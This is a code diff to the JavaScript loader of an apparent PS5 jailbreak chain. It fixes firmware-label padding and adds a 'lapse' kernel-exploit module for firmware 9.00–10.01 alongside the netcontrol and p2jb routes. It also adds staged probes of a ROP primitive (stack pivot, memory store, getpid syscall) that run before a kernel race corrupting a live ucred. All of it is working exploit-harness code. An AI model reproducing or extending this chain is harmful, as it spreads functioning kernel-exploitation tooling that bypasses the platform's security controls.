@@ -345,11 +345,18 @@ let compositionState = 0;
 let compositionLength = 0;
 let compositionError = null;
 
+/* Zero-padded "MM.mm", because it is used as a KEY into lapse-offsets.json and
+ * netctrl-ps5.js's GADGETS, and both spell single-digit majors "09.00". index
+ * .html pads before putting it in the query string, so the ?fw= path was always
+ * right; this UA fallback (direct navigation to this page) did not, so a 9.x
+ * console landing here without the param looked up "9.00", missed, and reported
+ * POOPS-OFFSETS-MISSING. Harmless while only 10.x was routed here, but the
+ * supported set now includes every 9.x, so pad here too. */
 const FW_LABEL = (function () {
     const p = Q.get("fw");
     if (p) return p;
-    const m = /PlayStation 5\/(\d+\.\d+)/.exec(navigator.userAgent);
-    return m ? m[1] : "??.??";
+    const m = /PlayStation 5\/(\d+)\.(\d+)/.exec(navigator.userAgent);
+    return m ? `${m[1].padStart(2, "0")}.${m[2].padStart(2, "0")}` : "??.??";
 })();
 
 function setCaption(text) {
@@ -2054,8 +2061,15 @@ async function handoffToLapse() {
     // report survives whatever keeps killing the renderer in the stage below.
     try {
         await loadScript("netctrl-ps5.js");
+        /* lapse-ps5.js carries the 09.00-10.01 route. The three kernel bugs
+           partition the range (lapse 09.00-10.01, netcontrol 10.20-12.00,
+           p2jb 12.02-12.70), so exactly one of these modules will claim any
+           given console; loading both is cheap and lets netctrl-ps5's router
+           hand off by name instead of the page having to know the split. */
+        await loadScript("lapse-ps5.js");
         const defined = (typeof window.netctrl_ps5 !== "undefined");
-        mark("NETCTRL-JS-LOADED", "defined=" + defined);
+        mark("NETCTRL-JS-LOADED", "defined=" + defined
+             + " lapse=" + (typeof window.lapse_ps5 !== "undefined"));
         report("netctrl_early", {
             defined: defined ? 1 : 0,
             version: defined ? window.netctrl_ps5.version : "none",
@@ -2155,6 +2169,7 @@ async function handoffToLapse() {
             ? window.netctrl_ps5.gadgetsFor(String(sk.FW_VERSION || ""))
             : null;
         window.rop_worker.init({
+            fw: String(sk.FW_VERSION || ""),
             kernelBase: sk.kernelBase,
             webkitBase: sk.webkitBase,
             gadgets: G || {},
@@ -2169,29 +2184,89 @@ async function handoffToLapse() {
            syscall, longjmp resume. A plausible pid means the primitive works;
            anything else stops here rather than proceeding to the race. */
         if (G) {
-            const r = await window.rop_worker.testGetpid();
-            mark("ROPW-GETPID", String(r.retval));
-            report("ropw_getpid", {pid: String(r.retval), ms: r.ms});
+            /* Staged bisect before the first real chain.
+             *
+             * A 12.00 run died inside testGetpid() with no beacon whatsoever —
+             * a dead renderer, not a throw — so the log said only "the chain
+             * killed us", not which part. Each probe below adds one element,
+             * and each beacons BEFORE the next one fires, so the last line in
+             * the log names the first element that does not survive. Every
+             * console attempt costs a reboot; this turns one attempt into an
+             * answer instead of another guess.
+             *
+             * dumpGadgets() is unconditional and comes first: if the run dies
+             * at the pivot, the resolved addresses are already in the log and
+             * can be checked against the modules without another boot. */
+            window.rop_worker.dumpGadgets();
+            mark("ROPW-GADGETS-DUMPED");
 
-            /* Same call through the SYNCHRONOUS path (busy-poll, no await).
-               If this returns the same pid, netctrl-ps5.js keeps its
-               synchronous API and its race timing - no async refactor. */
+            await window.rop_worker.testPivot();
+            mark("ROPW-PIVOT-OK", "pop_rsp/setjmp/longjmp/resume all survive");
+
+            await window.rop_worker.testStore();
+            mark("ROPW-STORE-OK", "mov_qword_rdi_rax + pop_rax/pop_rdi good");
+
+            /* SYNC getpid first, deliberately.
+             *
+             * The async path reports only via the worker's postMessage echo, so
+             * "chain died" and "worker never got back to its message loop" look
+             * identical — which is exactly the ambiguity the 12.00 runs are
+             * stuck in (one attempt killed the renderer here, the next simply
+             * stopped with no further beacon). fireSync polls a DONE flag the
+             * CHAIN writes, so its timeout can tell those two apart.
+             *
+             * It is also the path that actually matters: netctrl-ps5 issues
+             * every syscall through syscallSync. Proving the async one first
+             * was only ever an artifact of the original bring-up order. */
+            mark("ROPW-GETPID-FIRING", "sync path, first syscall of the run");
+            const s0 = window.rop_worker.testGetpidSync();
+            mark("ROPW-GETPID-SYNC", String(s0.retval) + "-spins=" + s0.spins);
+            report("ropw_getpid_sync", {pid: String(s0.retval), spins: s0.spins});
+
+            /* The async getpid is a CROSS-CHECK, not a dependency — every
+             * syscall netctrl-ps5 issues goes through syscallSync. Wrap it so a
+             * timeout throw cannot discard the sync proof already in the log:
+             * on 12.00 this is the call that has been failing, and losing the
+             * whole run to it is what made the failure so hard to localise.
+             * (A renderer crash still cannot be caught, which is why the sync
+             * path now runs first rather than after it.) */
+            let r = null;
             try {
-                const s = window.rop_worker.testGetpidSync();
-                mark("ROPW-GETPID-SYNC", String(s.retval) + "-spins=" + s.spins);
-                report("ropw_getpid_sync",
-                       {pid: String(s.retval), spins: s.spins,
-                        match: String(s.retval === r.retval)});
+                r = await window.rop_worker.testGetpid();
+                mark("ROPW-GETPID", String(r.retval));
+                report("ropw_getpid", {pid: String(r.retval), ms: r.ms});
+            } catch (eAsync) {
+                mark("ROPW-GETPID-ASYNC-FAILED",
+                     String(eAsync && eAsync.message).slice(0, 90));
+                report("ropw_getpid", {error: String(eAsync && eAsync.message).slice(0, 140)});
+            }
+
+            try {
+                /* Arming still requires BOTH paths to agree, unchanged: the
+                   race is what corrupts a live ucred, so a primitive that is
+                   only half-proven must not reach it. */
+                const s = s0;
                 /* ARMED. The race only runs once BOTH getpid proofs pass, so a
                    broken primitive stops us before the kernel is touched.
                    netctrl-ps5 now issues every syscall through
                    rop_worker.syscallSync and allocates via get_backing_store -
                    window.syscall / window.call / window.malloc all route to
                    lapse-runtime's runChain, which is fatal on 10.00. */
-                if (s.retval === r.retval) {
+                if (r && s.retval === r.retval) {
                     mark("NETCTRL-ARMED", "primitive verified both ways");
                     try {
-                        const ok = window.netctrl_ps5.run();
+                        /* Route by firmware. netctrl_ps5.run() owns 10.20-12.00
+                           (netcontrol) and 12.02-12.70 (p2jb) and refuses
+                           anything else; 09.00-10.01 is lapse's window and lives
+                           in its own module. Asking the module that owns the
+                           firmware keeps the split in one place. */
+                        const fwNow = String((window.slopkit
+                                              && window.slopkit.FW_VERSION) || "");
+                        const useLapse = window.lapse_ps5
+                            && window.lapse_ps5.LAPSE_FIRMWARES.has(fwNow);
+                        if (useLapse) mark("KERNEL-ROUTE", "lapse " + fwNow);
+                        const ok = useLapse ? window.lapse_ps5.run()
+                                            : window.netctrl_ps5.run();
                         mark("NETCTRL-RUN", String(ok));
                         report("netctrl_run", {result: String(ok)});
                         // fire AFTER the +1000ms SURVIVED marker so it is the last
@@ -2203,7 +2278,8 @@ async function handoffToLapse() {
                         setTimeout(function () { mark("REBOOT AND TRY AGAIN"); }, 2000);
                     }
                 } else {
-                    mark("NETCTRL-NOT-ARMED", "sync/async pid mismatch");
+                    mark("NETCTRL-NOT-ARMED", r ? "sync/async pid mismatch"
+                                               : "async getpid never completed");
                     setTimeout(function () { mark("REBOOT AND TRY AGAIN"); }, 2000);
                 }
             } catch (e) {
